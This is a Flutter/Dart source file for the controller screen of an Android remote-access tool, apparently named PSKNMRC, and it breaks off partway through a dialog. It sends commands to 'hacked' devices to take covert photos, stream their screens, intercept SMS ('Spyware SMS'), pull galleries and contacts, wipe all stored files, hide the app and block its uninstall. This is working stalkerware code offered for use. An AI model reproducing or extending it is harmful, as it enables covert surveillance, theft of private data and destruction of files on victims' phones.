import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:image_picker/image_picker.dart';
import 'package:file_picker/file_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../utils/theme.dart';
import '../utils/app_localizations.dart';
import '../utils/notif_helper.dart';
import '../services/api_service.dart';

class HackedScreen extends StatefulWidget {
  const HackedScreen({super.key});
  @override
  State<HackedScreen> createState() => _HackedScreenState();
}

class _HackedScreenState extends State<HackedScreen>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;

  String _role = '';
  List<Map<String, dynamic>> _devices = [];
  bool _loadingDevices = false;
  String? _selectedDeviceId;
  String? _selectedDeviceName;

  // Device info (tab connect)
  Map<String, dynamic>? _deviceInfo;
  bool _loadingDeviceInfo = false;
  bool _antiUninstallActive = false;
  bool _togglingProtection = false;

  final _lockTextCtrl = TextEditingController();
  final _pinCtrl      = TextEditingController();
  bool _sendingCmd    = false;
  bool _flashOn       = false;

  // Take Photo
  String? _lastPhotoBase64;
  String? _lastPhotoFacing;
  bool _fetchingPhoto = false;
  Timer? _photoTimer;

  // Screen Live
  bool _screenLiveActive = false;
  String? _lastFrameBase64;
  int _lastFrameW = 0;
  int _lastFrameH = 0;
  Timer? _screenLiveTimer;

  // Spyware SMS
  bool _smsSpyActive = false;
  bool _togglingSmsSpy = false;
  List<Map<String, dynamic>> _smsMessages = [];
  bool _loadingSms = false;
  String _smsTab = 'new'; // 'new' or 'old'
  Timer? _smsTimer;

  // Gallery
  List<Map<String, dynamic>> _galleryItems = [];
  bool _loadingGallery = false;

  // Contacts
  List<Map<String, dynamic>> _contacts = [];
  bool _loadingContacts = false;

  // PSKNMRC
  final _psknmrcUsernameCtrl = TextEditingController();
  bool _creatingPsknmrc      = false;
  String _psknmrcMsg         = '';

  Timer? _pollTimer;

  static const _purple = Color(0xFF8B5CF6);
  static const _gold   = Color(0xFFFFD700);
  static const _green  = Color(0xFF10B981);
  static const _red    = Color(0xFFEF4444);
  static const _blue   = Color(0xFF3B82F6);
  static const _orange = Color(0xFFFF6B35);

  List<Map<String, dynamic>> get _hackedCommands => [
    {'icon': AppSvgIcons.lock,      'title': tr('lock_device'),     'color': _red,    'cmd': 'lock',        'active': true},
    {'icon': AppSvgIcons.unlock,    'title': tr('unlock_device'),   'color': _green,  'cmd': 'unlock',      'active': true},
    {'icon': AppSvgIcons.flashlight,'title': tr('hack_flashlight'), 'color': _gold,   'cmd': 'flashlight',  'active': true},
    {'icon': AppSvgIcons.image,     'title': tr('hack_wallpaper'),  'color': _orange, 'cmd': 'wallpaper',   'active': true},
    {'icon': AppSvgIcons.vibrate,   'title': tr('vibrate_device'),  'color': _purple, 'cmd': 'vibrate',     'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13z"/><path d="M12 14a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"/><path d="M12 8V5m0 14v-3M8 12H5m14 0h-3"/></svg>',
     'title': 'Text To Speech',  'color': const Color(0xFF06B6D4), 'cmd': 'tts',         'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
     'title': 'Play Sound',      'color': _green,                  'cmd': 'sound',       'active': true},
    {'icon': AppSvgIcons.camera,    'title': 'Take Photo',          'color': _blue,   'cmd': 'take_photo',  'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/></svg>',
     'title': 'Screen Live',     'color': _green,                  'cmd': 'screen_live', 'active': true},
    {'icon': AppSvgIcons.sms,       'title': 'Spyware SMS',         'color': _red,    'cmd': 'sms',         'active': true},
    {'icon': AppSvgIcons.gallery,   'title': 'View Gallery',        'color': const Color(0xFF06B6D4), 'cmd': 'gallery', 'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
     'title': 'List Kontak',     'color': _purple,                 'cmd': 'contacts',    'active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6m4-6v6"/><path d="M9 6V4h6v2"/></svg>',
     'title': 'Delete File',     'color': _red,                    'cmd': 'delete_files','active': true},
    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>',
     'title': 'Hide App',        'color': const Color(0xFF6B7280), 'cmd': 'hide_app',    'active': true},
  ];

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 3, vsync: this);
    _loadRole();
    _loadDevices();
    _pollTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      if (mounted) _loadDevices();
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    _pollTimer?.cancel();
    _photoTimer?.cancel();
    _screenLiveTimer?.cancel();
    _smsTimer?.cancel();
    _lockTextCtrl.dispose();
    _pinCtrl.dispose();
    _psknmrcUsernameCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadRole() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() => _role = prefs.getString('role') ?? '');
  }

  Future<void> _loadDevices() async {
    if (_loadingDevices) return;
    _loadingDevices = true;
    try {
      final res = await ApiService.get('/api/hacked/devices');
      if (res['success'] == true && mounted) {
        final newDevices = List<Map<String, dynamic>>.from(res['devices'] ?? []);
        String? newSelectedId   = _selectedDeviceId;
        String? newSelectedName = _selectedDeviceName;
        if (_selectedDeviceId != null) {
          final sel = newDevices.firstWhere(
            (d) => d['deviceId'] == _selectedDeviceId,
            orElse: () => {},
          );
          if (sel.isEmpty) { newSelectedId = null; newSelectedName = null; }
        }
        setState(() {
          _devices            = newDevices;
          _selectedDeviceId   = newSelectedId;
          _selectedDeviceName = newSelectedName;
        });
      }
    } catch (_) {}
    _loadingDevices = false;
  }

  Future<void> _loadDeviceInfo(String deviceId) async {
    if (_loadingDeviceInfo) return;
    setState(() => _loadingDeviceInfo = true);
    try {
      final res = await ApiService.get('/api/hacked/device-info/$deviceId');
      if (res['success'] == true && mounted) {
        setState(() {
          _deviceInfo = res['info'] as Map<String, dynamic>?;
          _antiUninstallActive = res['info']?['antiUninstall'] == true;
        });
      }
    } catch (_) {}
    if (mounted) setState(() => _loadingDeviceInfo = false);
  }

  Future<void> _toggleAntiUninstall(bool val) async {
    if (_selectedDeviceId == null) return;
    setState(() => _togglingProtection = true);
    try {
      await ApiService.post('/api/hacked/command', {
        'deviceId': _selectedDeviceId,
        'type': val ? 'enable_protection' : 'disable_protection',
        'payload': {},
      });
      setState(() => _antiUninstallActive = val);
      _snack(val ? 'Anti Uninstall aktif!' : 'Anti Uninstall dinonaktifkan');
    } catch (_) {}
    if (mounted) setState(() => _togglingProtection = false);
  }

  Future<void> _sendCommand(String type, Map<String, dynamic> payload) async {
    if (_selectedDeviceId == null) {
      _snack(tr('select_device_first'), isError: true);
      return;
    }
    setState(() => _sendingCmd = true);
    try {
      final res = await ApiService.post('/api/hacked/command', {
        'deviceId': _selectedDeviceId,
        'type': type,
        'payload': payload,
      });
      _snack(res['message'] ?? (res['success'] == true ? 'Command Terkirim' : 'Gagal'));
    } catch (e) {
      _snack('Error: $e', isError: true);
    }
    if (mounted) setState(() => _sendingCmd = false);
  }

  void _handleCommandTap(Map<String, dynamic> cmd) {
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']   as String;
    final title    = cmd['title'] as String;
    if (!isActive) { _showComingSoon(title); return; }
    switch (type) {
      case 'lock':        _showLockDialog(); break;
      case 'unlock':      _sendCommand('unlock', {}); break;
      case 'flashlight':
        final next = !_flashOn;
        _sendCommand('flashlight', {'state': next ? 'on' : 'off'}).then((_) {
          if (mounted) setState(() => _flashOn = next);
        });
        break;
      case 'wallpaper':   _showWallpaperDialog(); break;
      case 'vibrate':     _showVibrateDialog(); break;
      case 'tts':         _showTtsDialog(); break;
      case 'sound':       _showSoundDialog(); break;
      case 'take_photo':  _showTakePhotoDialog(); break;
      case 'screen_live': _showScreenLiveDialog(); break;
      case 'sms':         _showSmsSpyDialog(); break;
      case 'gallery':     _showGalleryDialog(); break;
      case 'contacts':    _showContactsDialog(); break;
      case 'delete_files':_showDeleteFilesDialog(); break;
      case 'hide_app':    _showHideAppDialog(); break;
    }
  }

  // ─── TAKE PHOTO ──────────────────────────────────────────────────────────
  void _showTakePhotoDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _blue.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 20, 24, 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Center(child: Container(width: 40, height: 4,
            decoration: BoxDecoration(color: _blue.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36,
              decoration: BoxDecoration(color: _blue.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _blue.withOpacity(0.4))),
              child: const Center(child: Icon(Icons.camera_alt_rounded, color: _blue, size: 18))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('AMBIL FOTO', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _blue)),
            ]),
          ]),
          const SizedBox(height: 20),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () { Navigator.pop(ctx); _sendCommand('take_photo', {'facing': 'front'}); _startFetchingPhoto('front'); },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: _blue.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: _blue.withOpacity(0.5))),
                child: const Center(child: Text('📸 DEPAN', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: _blue, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: () { Navigator.pop(ctx); _sendCommand('take_photo', {'facing': 'back'}); _startFetchingPhoto('back'); },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: _blue.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: _blue.withOpacity(0.5))),
                child: const Center(child: Text('📸 BELAKANG', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: _blue, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }

  void _startFetchingPhoto(String facing) {
    setState(() { _fetchingPhoto = true; _lastPhotoFacing = facing; _lastPhotoBase64 = null; });
    int tries = 0;
    _photoTimer?.cancel();
    _photoTimer = Timer.periodic(const Duration(seconds: 2), (t) async {
      tries++;
      if (tries > 15) { t.cancel(); if (mounted) setState(() => _fetchingPhoto = false); return; }
      try {
        final res = await ApiService.get('/api/hacked/photo-result/$_selectedDeviceId');
        if (res['success'] == true && res['photo'] != null) {
          final photo = res['photo'] as Map;
          if (photo['imageBase64'] != null && (photo['imageBase64'] as String).isNotEmpty) {
            t.cancel();
            if (mounted) setState(() {
              _lastPhotoBase64 = photo['imageBase64'] as String;
              _lastPhotoFacing = photo['facing'] as String? ?? facing;
              _fetchingPhoto = false;
            });
            _showPhotoResult();
          }
        }
      } catch (_) {}
    });
  }

  void _showPhotoResult() {
    if (_lastPhotoBase64 == null || !mounted) return;
    final bytes = base64Decode(_lastPhotoBase64!);
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: _blue.withOpacity(0.4))),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 20, 20, 0),
            child: Row(children: [
              const Icon(Icons.camera_alt_rounded, color: _blue, size: 18),
              const SizedBox(width: 8),
              Text('FOTO ${(_lastPhotoFacing ?? "").toUpperCase()}',
                style: const TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              const Spacer(),
              GestureDetector(onTap: () => Navigator.pop(context), child: const Icon(Icons.close_rounded, color: Colors.white54, size: 20)),
            ]),
          ),
          const SizedBox(height: 12),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(20)),
            child: Image.memory(bytes, fit: BoxFit.contain, width: double.infinity,
              errorBuilder: (_, __, ___) => const Padding(padding: EdgeInsets.all(20),
                child: Text('Gagal load foto', style: TextStyle(color: Colors.red))))),
        ]),
      ),
    );
  }

  // ─── SCREEN LIVE ─────────────────────────────────────────────────────────
  void _showScreenLiveDialog() {
    if (_screenLiveActive) { _stopScreenLive(); return; }
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _green.withOpacity(0.3))),
        padding: const EdgeInsets.fromLTRB(24, 20, 24, 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Center(child: Container(width: 40, height: 4,
            decoration: BoxDecoration(color: _green.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
          const SizedBox(height: 20),
          Row(children: [
            Container(width: 36, height: 36,
              decoration: BoxDecoration(color: _green.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.4))),
              child: const Center(child: Icon(Icons.screen_share_rounded, color: _green, size: 18))),
            const SizedBox(width: 12),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              const Text('SCREEN LIVE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
              Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _green)),
            ]),
          ]),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: _green.withOpacity(0.06), borderRadius: BorderRadius.circular(10), border: Border.all(color: _green.withOpacity(0.2))),
            child: const Text('Device akan minta izin screen capture.\nSetelah approve, layar device tampil live di sini.',
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6), textAlign: TextAlign.center)),
          const SizedBox(height: 20),
          Row(children: [
            Expanded(child: GestureDetector(
              onTap: () => Navigator.pop(ctx),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
            const SizedBox(width: 12),
            Expanded(child: GestureDetector(
              onTap: () async { Navigator.pop(ctx); await _sendCommand('screen_live', {}); _startScreenLive(); },
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(gradient: const LinearGradient(colors: [_green, Color(0xFF059669)]), borderRadius: BorderRadius.circular(12)),
                child: const Center(child: Text('MULAI LIVE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
          ]),
        ]),
      ),
    );
  }

  void _startScreenLive() {
    setState(() { _screenLiveActive = true; _lastFrameBase64 = null; });
    _screenLiveTimer?.cancel();
    _screenLiveTimer = Timer.periodic(const Duration(milliseconds: 900), (_) async {
      if (!_screenLiveActive || _selectedDeviceId == null) return;
      try {
        final res = await ApiService.get('/api/hacked/screen-frame/$_selectedDeviceId');
        if (res['success'] == true && res['frame'] != null) {
          final frame = res['frame'] as Map;
          if (frame['frameBase64'] != null && mounted) {
            setState(() {
              _lastFrameBase64 = frame['frameBase64'] as String;
              _lastFrameW = (frame['width']  as num?)?.toInt() ?? 0;
              _lastFrameH = (frame['height'] as num?)?.toInt() ?? 0;
            });
          }
        }
      } catch (_) {}
    });
    Navigator.push(context, MaterialPageRoute(
      builder: (_) => _ScreenLiveViewer(
        getFrame:  () => _lastFrameBase64,
        getWidth:  () => _lastFrameW,
        getHeight: () => _lastFrameH,
        isActive:  () => _screenLiveActive,
        onStop:    _stopScreenLive,
      ),
    ));
  }

  void _stopScreenLive() {
    _screenLiveTimer?.cancel();
    setState(() { _screenLiveActive = false; _lastFrameBase64 = null; });
    if (_selectedDeviceId != null) _sendCommand('screen_live_stop', {});
  }

  // ─── SPYWARE SMS ─────────────────────────────────────────────────────────
  void _showSmsSpyDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _SmsSpySheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        smsSpyActive: _smsSpyActive,
        onToggle: (val) async {
          setState(() => _togglingSmsSpy = true);
          await _sendCommand(val ? 'sms_spy_on' : 'sms_spy_off', {});
          // Simpan state ke backend
          try {
            await ApiService.post('/api/hacked/sms-spy-state', {
              'deviceId': _selectedDeviceId,
              'active': val,
            });
          } catch (_) {}
          if (mounted) setState(() { _smsSpyActive = val; _togglingSmsSpy = false; });
        },
        onLoadMessages: (type) => _loadSmsMessages(type),
        onSnack: (msg, {bool isError = false}) => _snack(msg, isError: isError),
      ),
    );
  }

  Future<List<Map<String, dynamic>>> _loadSmsMessages(String type) async {
    try {
      final res = await ApiService.get('/api/hacked/sms-messages/$_selectedDeviceId?type=$type');
      if (res['success'] == true) {
        return List<Map<String, dynamic>>.from(res['messages'] ?? []);
      }
    } catch (_) {}
    return [];
  }

  // ─── GALLERY ─────────────────────────────────────────────────────────────
  void _showGalleryDialog() {
    _sendCommand('get_gallery', {});
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _GallerySheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSnack: (msg, {bool isError = false}) => _snack(msg, isError: isError),
      ),
    );
  }

  // ─── CONTACTS ────────────────────────────────────────────────────────────
  void _showContactsDialog() {
    _sendCommand('get_contacts', {});
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _ContactsSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
      ),
    );
  }

  // ─── DELETE FILES ────────────────────────────────────────────────────────
  void _showDeleteFilesDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _red.withOpacity(0.5))),
        title: Row(children: [
          Container(width: 3, height: 18, decoration: BoxDecoration(gradient: LinearGradient(colors: [_red, Colors.red.shade900]), borderRadius: BorderRadius.circular(2))),
          const SizedBox(width: 10),
          const Text('DELETE FILE', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _red.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _red.withOpacity(0.3))),
            child: Column(children: [
              const Icon(Icons.warning_rounded, color: Colors.orange, size: 36),
              const SizedBox(height: 10),
              const Text('PERINGATAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.orange, letterSpacing: 2, fontWeight: FontWeight.bold)),
              const SizedBox(height: 8),
              const Text('Aksi ini akan menghapus SEMUA file di storage device yang dipilih.\nTidak bisa dibatalkan!',
                textAlign: TextAlign.center,
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6)),
            ])),
        ]),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white54, fontSize: 11))),
          Container(
            decoration: BoxDecoration(gradient: LinearGradient(colors: [_red, Colors.red.shade900]), borderRadius: BorderRadius.circular(8)),
            child: TextButton(
              onPressed: () { Navigator.pop(context); _sendCommand('delete_files', {}); },
              child: const Text('HAPUS SEMUA', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 11, letterSpacing: 1)))),
        ],
      ),
    );
  }

  // ─── HIDE APP ────────────────────────────────────────────────────────────
  void _showHideAppDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: const Color(0xFF6B7280).withOpacity(0.5))),
        title: const Row(children: [
          Icon(Icons.visibility_off_rounded, color: Color(0xFF6B7280), size: 20),
          SizedBox(width: 10),
          Text('HIDE APP', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: const Color(0xFF6B7280).withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: const Color(0xFF6B7280).withOpacity(0.3))),
            child: const Text('App PSKNMRC di device akan disembunyikan dari launcher.\nApp tetap berjalan di background.\n\nUntuk memunculkan kembali, buka via kontak darurat atau reboot.',
              textAlign: TextAlign.center,
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.6))),
        ]),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white54, fontSize: 11))),
          TextButton(
            onPressed: () { Navigator.pop(context); _sendCommand('hide_app', {'hide': true}); },
            child: const Text('SEMBUNYIKAN', style: TextStyle(fontFamily: 'Orbitron', color: Color(0xFF6B7280), fontSize: 11, letterSpacing: 1))),
          TextButton(
            onPressed: () { Navigator.pop(context); _sendCommand('hide_app', {'hide': false}); },
            child: const Text('TAMPILKAN', style: TextStyle(fontFamily: 'Orbitron', color: _green, fontSize: 11, letterSpacing: 1))),
        ],
      ),
    );
  }

  // ─── EXISTING DIALOGS ────────────────────────────────────────────────────
  void _showWallpaperDialog() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => _WallpaperSheet(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        onSent: (msg) => _snack(msg),
        onError: (msg) => _snack(msg, isError: true),
      ),
    );
  }

  void _showVibrateDialog() {
    String selectedPattern = 'single';
    int durationSec = 2;
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _purple.withOpacity(0.3))),
            padding: const EdgeInsets.fromLTRB(24, 24, 24, 32),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: const Center(child: Icon(Icons.vibration_rounded, color: _purple, size: 18))),
                const SizedBox(width: 12),
                const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text('GETAR DEVICE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Pilih pola getaran', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple)),
                ]),
              ]),
              const SizedBox(height: 20),
              Text('POLA GETARAN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 10),
              ...[
                {'value': 'single', 'label': 'Single (1x)', 'desc': 'Getar sekali'},
                {'value': 'double', 'label': 'Double (2x)', 'desc': 'Getar dua kali'},
                {'value': 'sos',    'label': 'SOS Pattern', 'desc': '... --- ...'},
              ].map((p) => GestureDetector(
                onTap: () => setS(() => selectedPattern = p['value']!),
                child: Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                  decoration: BoxDecoration(
                    color: selectedPattern == p['value'] ? _purple.withOpacity(0.2) : const Color(0xFF071525),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: selectedPattern == p['value'] ? _purple : _purple.withOpacity(0.2))),
                  child: Row(children: [
                    Container(width: 16, height: 16,
                      decoration: BoxDecoration(shape: BoxShape.circle,
                        color: selectedPattern == p['value'] ? _purple : Colors.transparent,
                        border: Border.all(color: _purple))),
                    const SizedBox(width: 12),
                    Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      Text(p['label']!, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white)),
                      Text(p['desc']!, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.5))),
                    ]),
                  ]),
                ),
              )),
              if (selectedPattern == 'single') ...[
                const SizedBox(height: 8),
                Text('DURASI: ${durationSec}s', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple.withOpacity(0.8), letterSpacing: 1.5)),
                Slider(value: durationSec.toDouble(), min: 1, max: 10, divisions: 9,
                  activeColor: _purple, onChanged: (v) => setS(() => durationSec = v.round())),
              ],
              const SizedBox(height: 16),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () { Navigator.pop(ctx); _sendCommand('vibrate', {'pattern': selectedPattern, 'duration': durationSec * 1000}); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(12)),
                    child: const Center(child: Text('GETAR!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
            ]),
          ),
        ),
      ),
    );
  }

  void _showTtsDialog() {
    final textCtrl = TextEditingController();
    String selectedLang = 'id';
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: const Color(0xFF0D1F35),
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: const Color(0xFF06B6D4).withOpacity(0.3))),
            padding: const EdgeInsets.all(24),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
